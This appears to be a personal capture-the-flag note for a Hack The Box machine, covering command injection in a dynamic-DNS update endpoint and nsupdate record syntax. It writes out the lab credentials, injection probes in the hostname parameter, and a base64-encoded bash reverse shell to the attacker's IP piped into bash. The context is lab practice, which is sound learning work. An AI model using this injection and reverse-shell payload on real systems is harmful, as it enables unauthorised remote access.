# nsupdate

* [https://help.dyn.com/remote-access-api/return-codes/](https://help.dyn.com/remote-access-api/return-codes/)
* [https://www.noip.com/integrate/response](https://www.noip.com/integrate/response)
* [https://www.noip.com/integrate/request](https://www.noip.com/integrate/request)

## dns running ISC BIND 9.16.1

```
# related to DYNSTR HTB box
# using curl -u dynadns:sndanyd http://10.10.10.244/nic/update
# we get nochg 10.10.16.161

# got several 408 Request Timeout Errors
# debugged: for some reason, burp needs to have two empty lines at the end of sent request else ERROR

GET /nic/update?hostname=kashz.no-ip.htb&myip=10.10.16.161 HTTP/1.1
Authorization: Basic ZHluYWRuczpzbmRhbnlk
# response
good 10.10.16.161

# try code injection
GET /nic/update?hostname=id;kashz.no-ip.htb&myip=10.10.16.161 HTTP/1.1 => 911 [nsupdate failed]

GET /nic/update?hostname="$(whoami).no-ip.htb&myip=10.10.16.161 HTTP/1.1 => 911 good 10.10.16.161

# as we are using + to concatenate the string
# we need to find a base64 value without it, using normal ports 6969, 1337 etc has + in them so trying out a different port 999

$ echo -n "/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.161/999 0>&1'" | base64
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE2MS85OTkgMD4mMSc=

# shell success with
GET /nic/update?hostname=";echo+L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE2MS85OTkgMD4mMSc=+|+base64+-d+|+bash;kashz.no-ip.htb&myip=10.10.16.161 HTTP/1.1
```

## Adding new .key

[https://www.dns-school.org/Documentation/bind-arm/man.nsupdate.html](https://www.dns-school.org/Documentation/bind-arm/man.nsupdate.html) (Example section)

```
$ nsupdate -k <.key>-v

# adding Address(A) record
update add <sub-domain.DOMAIN> 86400 A <MY-IP>
send

# adding Pointer(PTR) record
# IP is to be reversed 10.10.16.161 will become 161.16.10.10.in-addr.arpa.
update add <IP>.in-addr.arpa. 300 PTR <sub-domain.domain>
send
```
